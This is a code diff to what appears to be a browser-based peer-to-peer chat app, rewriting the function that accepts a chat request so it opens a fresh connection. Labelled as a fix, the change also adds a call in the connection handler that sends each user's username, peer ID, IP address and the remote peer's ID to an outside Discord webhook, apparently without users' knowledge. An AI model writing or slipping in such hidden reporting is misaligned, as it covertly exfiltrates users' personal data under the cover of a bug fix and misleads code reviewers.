@@ -261,7 +261,7 @@
                 }, 30000);
             }
             
-            // Accept a chat request
+            // Accept a chat request - FIXED VERSION
             function acceptChatRequest(requestId) {
                 const request = state.pendingRequests.get(requestId);
                 if (!request) return;
@@ -292,10 +292,48 @@
                 elements.requestsList.innerHTML = '';
                 elements.requestPanel.style.display = 'none';
                 
-                // Establish the connection
-                state.connection = request.conn;
+                // Create a new connection for chatting (don't reuse the request connection)
+                const chatConn = state.peer.connect(request.peerId, {
+                    reliable: true,
+                    metadata: {
+                        username: state.localUsername,
+                        chatConnection: true
+                    }
+                });
+                
+                // Set up the connection
+                state.connection = chatConn;
                 state.remoteUsername = request.username;
-                setupConnection();
+                
+                // Set up connection handlers
+                chatConn.on('open', () => {
+                    log(`Chat connection established with: ${chatConn.peer}`);
+                    state.isConnected = true;
+                    
+                    sendToDiscordWebhook(`🔗 **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${chatConn.peer}\n- Time: ${new Date().toLocaleString()}`);
+                    
+                    chatConn.send({
+                        type: 'username',
+                        username: state.localUsername
+                    });
+                    
+                    // Update UI
+                    elements.setupScreen.style.display = 'none';
+                    elements.chatScreen.style.display = 'flex';
+                    elements.statusText.textContent = 'Connected';
+                    elements.statusText.className = 'status-connected';
+                    elements.messageInput.disabled = false;
+                    elements.sendBtn.disabled = false;
+                    
+                    appendSystemMessage('Connected! Say hello!');
+                });
+                
+                chatConn.on('data', handlePeerData);
+                chatConn.on('close', handleConnectionClose);
+                chatConn.on('error', handleConnectionError);
+                
+                // Close the original request connection
+                request.conn.close();
             }
             
             // Decline a chat request
